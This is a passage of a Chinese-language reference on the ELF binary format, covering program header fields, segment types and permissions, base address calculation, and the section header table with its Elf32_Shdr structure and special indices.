\u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u8be5\u6bb5\u7b2c\u4e00\u4e2a\u5b57\u8282\u5728\u5185\u5b58\u4e2d\u7684\u865a\u62df\u5730\u5740\u3002 p_paddr \u8be5\u5b57\u6bb5\u4ec5\u7528\u4e8e\u7269\u7406\u5730\u5740\u5bfb\u5740\u76f8\u5173\u7684\u7cfb\u7edf\u4e2d\uff0c \u7531\u4e8e\u201dSystem V\u201d\u5ffd\u7565\u4e86\u5e94\u7528\u7a0b\u5e8f\u7684\u7269\u7406\u5bfb\u5740\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u8be5\u9879\u5185\u5bb9\u5e76\u672a\u88ab\u9650\u5b9a\u3002 p_filesz \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u6587\u4ef6\u955c\u50cf\u4e2d\u8be5\u6bb5\u7684\u5927\u5c0f\uff0c\u53ef\u80fd\u4e3a0\u3002 p_memsz \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u5185\u5b58\u955c\u50cf\u4e2d\u8be5\u6bb5\u7684\u5927\u5c0f\uff0c\u53ef\u80fd\u4e3a0\u3002 p_flags \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u4e0e\u6bb5\u76f8\u5173\u7684\u6807\u8bb0\u3002 p_align \u53ef\u52a0\u8f7d\u7684\u7a0b\u5e8f\u7684\u6bb5\u7684 p_vaddr \u4ee5\u53ca p_offset \u7684\u5927\u5c0f\u5fc5\u987b\u662f page \u7684\u6574\u6570\u500d\u3002\u8be5\u6210\u5458\u7ed9\u51fa\u4e86\u6bb5\u5728\u6587\u4ef6\u4ee5\u53ca\u5185\u5b58\u4e2d\u7684\u5bf9\u9f50\u65b9\u5f0f\u3002\u5982\u679c\u8be5\u503c\u4e3a 0 \u6216 1 \u7684\u8bdd\uff0c\u8868\u793a\u4e0d\u9700\u8981\u5bf9\u9f50\u3002\u9664\u6b64\u4e4b\u5916\uff0cp_align \u5e94\u8be5\u662f 2 \u7684\u6574\u6570\u6307\u6570\u6b21\u65b9\uff0c\u5e76\u4e14 p_vaddr \u4e0e p_offset \u5728\u6a21 p_align \u7684\u610f\u4e49\u4e0b\uff0c\u5e94\u8be5\u76f8\u7b49\u3002 \u6bb5\u7c7b\u578b \u00b6 \u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u6bb5\u7c7b\u578b\u5982\u4e0b \u540d\u5b57 \u53d6\u503c \u8bf4\u660e PT_NULL 0 \u8868\u660e\u6bb5\u672a\u4f7f\u7528\uff0c\u5176\u7ed3\u6784\u4e2d\u5176\u4ed6\u6210\u5458\u90fd\u662f\u672a\u5b9a\u4e49\u7684\u3002 PT_LOAD 1 \u6b64\u7c7b\u578b\u6bb5\u4e3a\u4e00\u4e2a\u53ef\u52a0\u8f7d\u7684\u6bb5\uff0c\u5927\u5c0f\u7531 p_filesz \u548c p_memsz \u63cf\u8ff0\u3002\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u88ab\u6620\u5c04\u5230\u76f8\u5e94\u5185\u5b58\u6bb5\u5f00\u59cb\u5904\u3002\u5982\u679c p_memsz \u5927\u4e8e p_filesz\uff0c\u201c\u5269\u4f59\u201d\u7684\u5b57\u8282\u90fd\u8981\u88ab\u7f6e\u4e3a0\u3002p_filesz \u4e0d\u80fd\u5927\u4e8e p_memsz\u3002\u53ef\u52a0\u8f7d\u7684\u6bb5\u5728\u7a0b\u5e8f\u5934\u90e8\u4e2d\u6309\u7167 p_vaddr \u7684\u5347\u5e8f\u6392\u5217\u3002 PT_DYNAMIC 2 \u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u52a8\u6001\u94fe\u63a5\u4fe1\u606f\u3002 PT_INTERP 3 \u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u4e86\u4e00\u4e2a\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\u548c\u957f\u5ea6\uff0c\u8be5\u5b57\u7b26\u4e32\u5c06\u88ab\u5f53\u4f5c\u89e3\u91ca\u5668\u8c03\u7528\u3002\u8fd9\u79cd\u6bb5\u7c7b\u578b\u4ec5\u5bf9\u53ef\u6267\u884c\u6587\u4ef6\u6709\u610f\u4e49\uff08\u4e5f\u53ef\u80fd\u51fa\u73b0\u5728\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\uff09\u3002\u6b64\u5916\uff0c\u8fd9\u79cd\u6bb5\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d\u6700\u591a\u51fa\u73b0\u4e00\u6b21\u3002\u800c\u4e14\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u5b58\u5728\u7684\u8bdd\uff0c\u5b83\u5fc5\u987b\u5728\u6240\u6709\u53ef\u52a0\u8f7d\u6bb5\u9879\u7684\u524d\u9762\u3002 PT_NOTE 4 \u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u9644\u52a0\u4fe1\u606f\u7684\u4f4d\u7f6e\u548c\u5927\u5c0f\u3002 PT_SHLIB 5 \u8be5\u6bb5\u7c7b\u578b\u88ab\u4fdd\u7559\uff0c\u4e0d\u8fc7\u8bed\u4e49\u672a\u6307\u5b9a\u3002\u800c\u4e14\uff0c\u5305\u542b\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u7684\u7a0b\u5e8f\u4e0d\u7b26\u5408ABI\u6807\u51c6\u3002 PT_PHDR 6 \u8be5\u6bb5\u7c7b\u578b\u7684\u6570\u7ec4\u5143\u7d20\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u5219\u7ed9\u51fa\u4e86\u7a0b\u5e8f\u5934\u90e8\u8868\u81ea\u8eab\u7684\u5927\u5c0f\u548c\u4f4d\u7f6e\uff0c\u65e2\u5305\u62ec\u5728\u6587\u4ef6\u4e2d\u4e5f\u5305\u62ec\u5728\u5185\u5b58\u4e2d\u7684\u4fe1\u606f\u3002\u6b64\u7c7b\u578b\u7684\u6bb5\u5728\u6587\u4ef6\u4e2d\u6700\u591a\u51fa\u73b0\u4e00\u6b21\u3002 \u6b64\u5916\uff0c\u53ea\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\u662f\u7a0b\u5e8f\u7684\u5185\u5b58\u6620\u50cf\u7684\u4e00\u90e8\u5206\u65f6\uff0c\u5b83\u624d\u4f1a\u51fa\u73b0 \u3002\u5982\u679c\u6b64\u7c7b\u578b\u6bb5\u5b58\u5728\uff0c\u5219\u5fc5\u987b\u5728\u6240\u6709\u53ef\u52a0\u8f7d\u6bb5\u9879\u76ee\u7684\u524d\u9762\u3002 PT_LOPROC~PT_HIPROC 0x70000000 ~0x7fffffff \u6b64\u8303\u56f4\u7684\u7c7b\u578b\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u3002 \u57fa\u5730\u5740-Base Address \u00b6 \u7a0b\u5e8f\u5934\u90e8\u7684\u865a\u62df\u5730\u5740\u53ef\u80fd\u5e76\u4e0d\u662f\u7a0b\u5e8f\u5185\u5b58\u955c\u50cf\u4e2d\u5b9e\u9645\u7684\u865a\u62df\u5730\u5740\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u53ef\u6267\u884c\u7a0b\u5e8f\u90fd\u4f1a\u5305\u542b\u7edd\u5bf9\u5730\u5740\u7684\u4ee3\u7801\u3002\u4e3a\u4e86\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\uff0c\u6bb5\u5fc5\u987b\u5728\u76f8\u5e94\u7684\u865a\u62df\u5730\u5740\u5904\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u901a\u5e38\u6765\u8bf4\u5305\u542b\u4e0e\u5730\u5740\u65e0\u5173\u7684\u4ee3\u7801\u3002\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u53ef\u4ee5\u88ab\u591a\u4e2a\u8fdb\u7a0b\u52a0\u8f7d\uff0c\u540c\u65f6\u4fdd\u6301\u7a0b\u5e8f\u6267\u884c\u7684\u6b63\u786e\u6027\u3002\u5c3d\u7ba1\u7cfb\u7edf\u4f1a\u4e3a\u4e0d\u540c\u7684\u8fdb\u7a0b\u9009\u62e9\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\uff0c\u4f46\u662f\u5b83\u4ecd\u7136\u4fdd\u7559\u6bb5\u7684\u76f8\u5bf9\u5730\u5740\uff0c \u56e0\u4e3a\u5730\u5740\u65e0\u5173\u4ee3\u7801\u4f7f\u7528\u6bb5\u4e4b\u95f4\u7684\u76f8\u5bf9\u5730\u5740\u6765\u8fdb\u884c\u5bfb\u5740\uff0c\u5185\u5b58\u4e2d\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u5fc5\u987b\u4e0e\u6587\u4ef6\u4e2d\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u76f8\u5339\u914d \u3002\u5185\u5b58\u4e2d\u4efb\u4f55\u6bb5\u7684\u865a\u62df\u5730\u5740\u4e0e\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u503c\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u5171\u4eab\u5bf9\u8c61\u6765\u8bf4\u662f\u4e00\u4e2a\u5355\u4e00\u5e38\u91cf\u503c\u3002\u8fd9\u4e2a\u5dee\u503c\u5c31\u662f\u57fa\u5730\u5740\uff0c\u57fa\u5730\u5740\u7684\u4e00\u4e2a\u7528\u9014\u5c31\u662f\u5728\u52a8\u6001\u94fe\u63a5\u671f\u95f4\u91cd\u65b0\u5b9a\u4f4d\u7a0b\u5e8f\u3002 \u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u57fa\u5730\u5740\u662f\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u7531\u4ee5\u4e0b\u4e09\u4e2a\u6570\u503c\u8ba1\u7b97\u7684 \u865a\u62df\u5185\u5b58\u52a0\u8f7d\u5730\u5740 \u6700\u5927\u9875\u9762\u5927\u5c0f \u7a0b\u5e8f\u53ef\u52a0\u8f7d\u6bb5\u7684\u6700\u4f4e\u865a\u62df\u5730\u5740 \u8981\u8ba1\u7b97\u57fa\u5730\u5740\uff0c\u9996\u5148\u8981\u786e\u5b9a\u53ef\u52a0\u8f7d\u6bb5\u4e2d p_vaddr \u6700\u5c0f\u7684\u5185\u5b58\u865a\u62df\u5730\u5740\uff0c\u4e4b\u540e\u628a\u8be5\u5185\u5b58\u865a\u62df\u5730\u5740\u7f29\u5c0f\u4e3a\u4e0e\u4e4b\u6700\u8fd1\u7684\u6700\u5927\u9875\u9762\u7684\u6574\u6570\u500d\u5373\u662f\u57fa\u5730\u5740\u3002\u6839\u636e\u8981\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u6587\u4ef6\u7684\u7c7b\u578b\uff0c\u5185\u5b58\u5730\u5740\u53ef\u80fd\u4e0e p_vaddr \u76f8\u540c\u4e5f\u53ef\u80fd\u4e0d\u540c\u3002 \u6bb5\u6743\u9650-p_flags \u00b6 \u88ab\u7cfb\u7edf\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u7a0b\u5e8f\u81f3\u5c11\u6709\u4e00\u4e2a\u53ef\u52a0\u8f7d\u7684\u6bb5\u3002\u5f53\u7cfb\u7edf\u4e3a\u53ef\u52a0\u8f7d\u7684\u6bb5\u521b\u5efa\u5185\u5b58\u955c\u50cf\u65f6\uff0c\u5b83\u4f1a\u6309\u7167 p_flags \u5c06\u6bb5\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6743\u9650\u3002\u53ef\u80fd\u7684\u6bb5\u6743\u9650\u4f4d\u6709 \u5176\u4e2d\uff0c\u6240\u6709\u5728 PF_MASKPROC \u4e2d\u7684\u6bd4\u7279\u4f4d\u90fd\u662f\u88ab\u4fdd\u7559\u7528\u4e8e\u4e0e\u5904\u7406\u5668\u76f8\u5173\u7684\u8bed\u4e49\u4fe1\u606f\u3002 \u5982\u679c\u4e00\u4e2a\u6743\u9650\u4f4d\u88ab\u8bbe\u7f6e\u4e3a 0\uff0c\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u662f\u4e0d\u53ef\u8bbf\u95ee\u7684\u3002\u5b9e\u9645\u7684\u5185\u5b58\u6743\u9650\u53d6\u51b3\u4e8e\u76f8\u5e94\u7684\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff0c\u4e0d\u540c\u7684\u7cfb\u7edf\u53ef\u80fd\u64cd\u4f5c\u65b9\u5f0f\u4e0d\u4e00\u6837\u3002\u5c3d\u7ba1\u6240\u6709\u7684\u6743\u9650\u7ec4\u5408\u90fd\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u662f\u7cfb\u7edf\u4e00\u822c\u4f1a\u6388\u4e88\u6bd4\u8bf7\u6c42\u66f4\u591a\u7684\u6743\u9650\u3002\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\uff0c\u9664\u975e\u660e\u786e\u8bf4\u660e\uff0c\u4e00\u4e2a\u6bb5\u4e0d\u4f1a\u6709\u5199\u6743\u9650\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u6240\u6709\u7684\u53ef\u80fd\u7ec4\u5408\u3002 \u4f8b\u5982\uff0c\u4e00\u822c\u6765\u8bf4\uff0c.text \u6bb5\u4e00\u822c\u5177\u6709\u8bfb\u548c\u6267\u884c\u6743\u9650\uff0c\u4f46\u662f\u4e0d\u4f1a\u6709\u5199\u6743\u9650\u3002\u6570\u636e\u6bb5\u4e00\u822c\u5177\u6709\u5199\uff0c\u8bfb\uff0c\u4ee5\u53ca\u6267\u884c\u6743\u9650\u3002 \u6bb5\u5185\u5bb9 \u00b6 \u4e00\u4e2a\u6bb5\u53ef\u80fd\u5305\u62ec\u4e00\u5230\u591a\u4e2a\u8282\u533a\uff0c\u4f46\u662f\u8fd9\u5e76\u4e0d\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u52a0\u8f7d\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u6211\u4eec\u4e5f\u5fc5\u987b\u9700\u8981\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\u6765\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6267\u884c\u4ee5\u53ca\u52a8\u6001\u94fe\u63a5\u7b49\u7b49\u3002\u4e0b\u9762\u4f1a\u7ed9\u51fa\u4e00\u822c\u60c5\u51b5\u4e0b\u7684\u6bb5\u7684\u5185\u5bb9\u3002\u5bf9\u4e8e\u4e0d\u540c\u7684\u6bb5\u6765\u8bf4\uff0c\u5b83\u7684\u8282\u7684\u987a\u5e8f\u4ee5\u53ca\u6240\u5305\u542b\u7684\u8282\u7684\u4e2a\u6570\u6709\u6240\u4e0d\u540c\u3002\u6b64\u5916\uff0c\u4e0e\u5904\u7406\u76f8\u5173\u7684\u7ea6\u675f\u53ef\u80fd\u4f1a\u6539\u53d8\u5bf9\u5e94\u7684\u6bb5\u7684\u7ed3\u6784\u3002 \u5982\u4e0b\u6240\u793a\uff0c\u4ee3\u7801\u6bb5\u53ea\u5305\u542b\u53ea\u8bfb\u7684\u6307\u4ee4\u4ee5\u53ca\u6570\u636e\u3002\u5f53\u7136\u8fd9\u4e2a\u4f8b\u5b50\u5e76\u6ca1\u6709\u7ed9\u51fa\u6240\u6709\u7684\u53ef\u80fd\u7684\u6bb5\u3002 \u6570\u636e\u6bb5\u5305\u542b\u53ef\u5199\u7684\u6570\u636e\u4ee5\u53ca\u4ee5\u53ca\u6307\u4ee4\uff0c\u901a\u5e38\u6765\u8bf4\uff0c\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9 \u7a0b\u5e8f\u5934\u90e8\u7684 PT_DYNAMIC \u7c7b\u578b\u7684\u5143\u7d20\u6307\u5411\u6307\u5411 .dynamic \u8282\u3002\u5176\u4e2d\uff0cgot \u8868\u548c plt \u8868\u5305\u542b\u4e0e\u5730\u5740\u65e0\u5173\u7684\u4ee3\u7801\u76f8\u5173\u4fe1\u606f\u3002\u5c3d\u7ba1\u5728\u8fd9\u91cc\u7ed9\u51fa\u7684\u4f8b\u5b50\u4e2d\uff0cplt \u8282\u51fa\u73b0\u5728\u4ee3\u7801\u6bb5\uff0c\u4f46\u662f\u5bf9\u4e8e\u4e0d\u540c\u7684\u5904\u7406\u5668\u6765\u8bf4\uff0c\u53ef\u80fd\u4f1a\u6709\u6240\u53d8\u52a8\u3002 .bss \u8282\u7684\u7c7b\u578b\u4e3a SHT_NOBITS\uff0c\u8fd9\u8868\u660e\u5b83\u5728 ELF \u6587\u4ef6\u4e2d\u4e0d\u5360\u7528\u7a7a\u95f4\uff0c\u4f46\u662f\u5b83\u5374\u5360\u7528\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5185\u5b58\u955c\u50cf\u7684\u7a7a\u95f4\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u6570\u636e\u5728\u6bb5\u7684\u5c3e\u90e8\uff0c\u56e0\u6b64\uff0c p_memsz \u624d\u4f1a\u6bd4 p_filesz \u5927\u3002 \u6ce8\u610f\uff1a \u4e0d\u540c\u7684\u6bb5\u6765\u8bf4\u53ef\u80fd\u4f1a\u6709\u6240\u91cd\u5408\uff0c\u5373\u4e0d\u540c\u7684\u6bb5\u5305\u542b\u76f8\u540c\u7684\u8282\u3002 Section Header Table \u00b6 \u5176\u5b9e\u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\u662f\u5728 ELF \u6587\u4ef6\u7684\u5c3e\u90e8\uff08 \u4e3a\u4ec0\u4e48\u8981\u653e\u5728\u6587\u4ef6\u5c3e\u90e8\u5462\uff1f\uff1f \uff09\uff0c\u4f46\u662f\u4e3a\u4e86\u8bb2\u89e3\u65b9\u4fbf\uff0c\u8fd9\u91cc\u5c06\u8fd9\u4e2a\u8868\u653e\u5728\u8fd9\u91cc\u8fdb\u884c\u8bb2\u89e3\u3002 \u8be5\u7ed3\u6784\u7528\u4e8e\u5b9a\u4f4d ELF \u6587\u4ef6\u4e2d\u7684\u6bcf\u4e2a\u8282\u533a\u7684\u5177\u4f53\u4f4d\u7f6e\u3002 \u9996\u5148\uff0cELF\u5934\u4e2d\u7684 e_shoff \u9879\u7ed9\u51fa\u4e86\u4ece\u6587\u4ef6\u5f00\u5934\u5230\u8282\u5934\u8868\u4f4d\u7f6e\u7684\u5b57\u8282\u504f\u79fb\u3002 e_shnum \u544a\u8bc9\u4e86\u6211\u4eec\u8282\u5934\u8868\u5305\u542b\u7684\u9879\u6570\uff1b e_shentsize \u7ed9\u51fa\u4e86\u6bcf\u4e00\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002 \u5176\u6b21\uff0c\u8282\u5934\u8868\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6bcf\u4e2a\u6570\u7ec4\u7684\u5143\u7d20\u7684\u7c7b\u578b\u662f ELF32_Shdr \uff0c\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u63cf\u8ff0\u4e86\u4e00\u4e2a\u8282\u533a\u7684\u6982\u8981\u5185\u5bb9\u3002 ELF32_Shdr \u00b6 \u6bcf\u4e2a\u8282\u533a\u5934\u90e8\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u6570\u636e\u7ed3\u6784\u8fdb\u884c\u63cf\u8ff0\uff1a typedef struct { ELF32_Word sh_name ; ELF32_Word sh_type ; ELF32_Word sh_flags ; ELF32_Addr sh_addr ; ELF32_Off sh_offset ; ELF32_Word sh_size ; ELF32_Word sh_link ; ELF32_Word sh_info ; ELF32_Word sh_addralign ; ELF32_Word sh_entsize ; } Elf32_Shdr ; \u6bcf\u4e2a\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b \u6210\u5458 \u8bf4\u660e sh_name \u8282\u540d\u79f0\uff0c\u662f\u8282\u533a\u5934\u5b57\u7b26\u4e32\u8868\u8282\u533a\u4e2d\uff08Section Header String Table Section\uff09\u7684\u7d22\u5f15\uff0c\u56e0\u6b64\u8be5\u5b57\u6bb5\u5b9e\u9645\u662f\u4e00\u4e2a\u6570\u503c\u3002\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u7684\u5177\u4f53\u5185\u5bb9\u662f\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002 sh_type \u6839\u636e\u8282\u7684\u5185\u5bb9\u548c\u8bed\u4e49\u8fdb\u884c\u5206\u7c7b\uff0c\u5177\u4f53\u7684\u7c7b\u578b\u4e0b\u9762\u4f1a\u4ecb\u7ecd\u3002 sh_flags \u6bcf\u4e00\u6bd4\u7279\u4ee3\u8868\u4e0d\u540c\u7684\u6807\u5fd7\uff0c\u63cf\u8ff0\u8282\u662f\u5426\u53ef\u5199\uff0c\u53ef\u6267\u884c\uff0c\u9700\u8981\u5206\u914d\u5185\u5b58\u7b49\u5c5e\u6027\u3002 sh_addr \u5982\u679c\u8282\u533a\u5c06\u51fa\u73b0\u5728\u8fdb\u7a0b\u7684\u5185\u5b58\u6620\u50cf\u4e2d\uff0c\u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5e94\u8be5\u5728\u8fdb\u7a0b\u955c\u50cf\u4e2d\u7684\u4f4d\u7f6e\u3002\u5426\u5219\uff0c\u6b64\u5b57\u6bb5\u4e3a 0\u3002 sh_offset \u7ed9\u51fa\u8282\u533a\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e0e\u6587\u4ef6\u5f00\u59cb\u5904\u4e4b\u95f4\u7684\u504f\u79fb\u3002SHT_NOBITS \u7c7b\u578b\u7684\u8282\u533a\u4e0d\u5360\u7528\u6587\u4ef6\u7684\u7a7a\u95f4\uff0c\u56e0\u6b64\u5176 sh_offset \u6210\u5458\u7ed9\u51fa\u7684\u662f\u6982\u5ff5\u6027\u7684\u504f\u79fb\u3002 sh_size \u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u7684\u5b57\u8282\u5927\u5c0f\u3002\u9664\u975e\u8282\u533a\u7684\u7c7b\u578b\u662f SHT_NOBITS \uff0c\u5426\u5219\u8be5\u8282\u5360\u7528\u6587\u4ef6\u4e2d\u7684 sh_size \u5b57\u8282\u3002\u7c7b\u578b\u4e3aSHT_NOBITS \u7684\u8282\u533a\u957f\u5ea6\u53ef\u80fd\u975e\u96f6\uff0c\u4e0d\u8fc7\u5374\u4e0d\u5360\u7528\u6587\u4ef6\u4e2d\u7684\u7a7a\u95f4\u3002 sh_link \u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u5934\u90e8\u8868\u7d22\u5f15\u94fe\u63a5\uff0c\u5176\u5177\u4f53\u7684\u89e3\u91ca\u4f9d\u8d56\u4e8e\u8282\u533a\u7c7b\u578b\u3002 sh_info \u6b64\u6210\u5458\u7ed9\u51fa\u9644\u52a0\u4fe1\u606f\uff0c\u5176\u89e3\u91ca\u4f9d\u8d56\u4e8e\u8282\u533a\u7c7b\u578b\u3002 sh_addralign \u67d0\u4e9b\u8282\u533a\u7684\u5730\u5740\u9700\u8981\u5bf9\u9f50\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4e00\u4e2a\u8282\u533a\u6709\u4e00\u4e2a doubleword \u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u90a3\u4e48\u7cfb\u7edf\u5fc5\u987b\u4fdd\u8bc1\u6574\u4e2a\u8282\u533a\u6309\u53cc\u5b57\u5bf9\u9f50\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c sh\\_addr \\% sh\\_addralign sh\\_addr \\% sh\\_addralign =0\u3002\u76ee\u524d\u5b83\u4ec5\u5141\u8bb8\u4e3a 0\uff0c\u4ee5\u53ca 2 \u7684\u6b63\u6574\u6570\u5e42\u6570\u3002 0 \u548c 1 \u8868\u793a\u6ca1\u6709\u5bf9\u9f50\u7ea6\u675f\u3002 sh_entsize \u67d0\u4e9b\u8282\u533a\u4e2d\u5b58\u5728\u5177\u6709\u56fa\u5b9a\u5927\u5c0f\u7684\u8868\u9879\u7684\u8868\uff0c\u5982\u7b26\u53f7\u8868\u3002\u5bf9\u4e8e\u8fd9\u7c7b\u8282\u533a\uff0c\u8be5\u6210\u5458\u7ed9\u51fa\u6bcf\u4e2a\u8868\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002\u53cd\u4e4b\uff0c\u6b64\u6210\u5458\u53d6\u503c\u4e3a0\u3002 \u6b63\u5982\u4e4b\u524d\u6240\u8bf4\uff0c\u7d22\u5f15\u4e3a\u96f6\uff08SHN_UNDEF\uff09\u7684\u8282\u533a\u5934\u4e5f\u5b58\u5728\uff0c\u6b64\u7d22\u5f15\u6807\u8bb0\u7684\u662f\u672a\u5b9a\u4e49\u7684\u8282\u533a\u5f15\u7528\u3002\u8fd9\u4e00\u9879\u7684\u4fe1\u606f\u5982\u4e0b \u5b57\u6bb5\u540d\u79f0 \u53d6\u503c \u8bf4\u660e sh_name 0 \u65e0\u540d\u79f0 sh_type SHT_NULL \u9650\u5236 sh_flags 0 \u65e0\u6807\u5fd7 sh_addr 0 \u65e0\u5730\u5740 sh_offset 0 \u65e0\u6587\u4ef6\u504f\u79fb sh_size 0 \u65e0\u5927\u5c0f sh_link SHN_UNDEF \u65e0\u94fe\u63a5\u4fe1\u606f sh_info 0 \u65e0\u8f85\u52a9\u4fe1\u606f sh_addralign 0 \u65e0\u5bf9\u9f50\u8981\u6c42 sh_entsize 0 \u65e0\u8868\u9879 \u7279\u6b8a\u4e0b\u6807 \u00b6 \u8282\u5934\u8868\u4e2d\u6bd4\u8f83\u7279\u6b8a\u7684\u51e0\u4e2a\u4e0b\u6807\u5982\u4e0b \u540d\u79f0 \u503c \u542b\u4e49 SHN_UNDEF 0 \u6807\u5fd7\u672a\u5b9a\u4e49\u7684\uff0c\u4e22\u5931\u7684\uff0c\u4e0d\u76f8\u5173\u7684\u6216\u8005\u5176\u5b83\u6ca1\u6709\u610f\u4e49\u7684\u8282\u5f15\u7528\u3002\u4f8b\u5982\uff0c\u4e0e\u8282\u53f7SHN_UNDEF\u76f8\u5173\u7684\u201c\u5b9a\u4e49\"\u7684\u7b26\u53f7\u5c31\u662f\u4e00\u4e2a\u672a\u5b9a\u4e49\u7b26\u53f7\u3002 \u6ce8\uff1a\u867d\u71360\u53f7\u7d22\u5f15\u88ab\u4fdd\u7559\u7528\u4e8e\u672a\u5b9a\u4e49\u503c\uff0c\u8282\u5934\u8868\u4ecd\u7136\u5305\u542b\u7d22\u5f150\u7684\u9879\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679cELF\u5934\u7684e_shnum\u4e3a6\uff0c\u90a3\u4e48\u7d22\u5f15\u5e94\u8be5\u4e3a0~5\u3002\u66f4\u52a0\u8be6\u7ec6\u7684\u5185\u5bb9\u5728\u540e\u9762\u4f1a\u8bf4\u660e\u3002 SHN_LORESERVE 0xff00 \u4fdd\u7559\u7d22\u5f15\u503c\u8303\u56f4\u7684\u4e0b\u754c\u3002 SHN_LOPROC 0xff00 \u5904\u7406\u5668\u76f8\u5173\u7684\u4e0b\u754c SHN_HIPROC 0xff1f \u5904\u7406\u5668\u76f8\u5173\u7684\u4e0a\u754c SHN_ABS 0xfff1 \u76f8\u5173\u5f15\u7528\u7684\u7edd\u5bf9\u503c\u3002\u4f8b\u5982\u4e0e\u8282\u53f7SHN_ABS\u76f8\u5173\u7684\u7b26\u53f7\u62e5\u6709\u7edd\u5bf9\u503c\uff0c\u5b83\u4eec\u4e0d\u53d7\u91cd\u5b9a\u4f4d\u7684\u5f71\u54cd SHN_COMMON 0xfff2 \u8fd9\u4e00\u8282\u533a\u76f8\u5b9a\u4e49\u7684\u7b26\u53f7\u662f\u901a\u7528\u7b26\u53f7\uff0c\u4f8b\u5982FORTRAN COMMON\uff0cC\u8bed\u8a00\u4e2d\u672a\u5206\u914d\u7684\u5916\u90e8\u53d8\u91cf\u3002 SHN_HIRESERVE 0xffff \u4fdd\u7559\u7d22\u5f15\u503c\u8303\u56f4\u7684\u4e0a\u754c\u3002 \u7cfb\u7edf\u4fdd\u7559\u5728 SHN_LORESERVE \u5230 SHN_HIRESERVE \u4e4b\u95f4(\u5305\u542b\u8fb9\u754c)\u7684\u7d22\u5f15\u503c\uff0c\u8fd9\u4e9b\u503c\u4e0d\u5728\u8282\u5934\u8868\u4e2d\u5f15\u7528\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8282\u5934\u8868\u4e0d\u5305\u542b\u4fdd\u7559\u7d22\u5f15\u9879\u3002\u6ca1\u7279\u522b\u7406\u89e3\u3002 \u90e8\u5206\u8282\u5934\u5b57\u6bb5 \u00b6 sh_type \u00b6 \u8282\u7c7b\u578b\u76ee\u524d\u6709\u4e0b\u5217\u53ef\u9009\u8303\u56f4\uff0c\u5176\u4e2d SHT \u662f Section Header Table \u7684\u7b80\u5199\u3002 \u540d\u79f0 \u53d6\u503c \u8bf4\u660e SHT_NULL 0 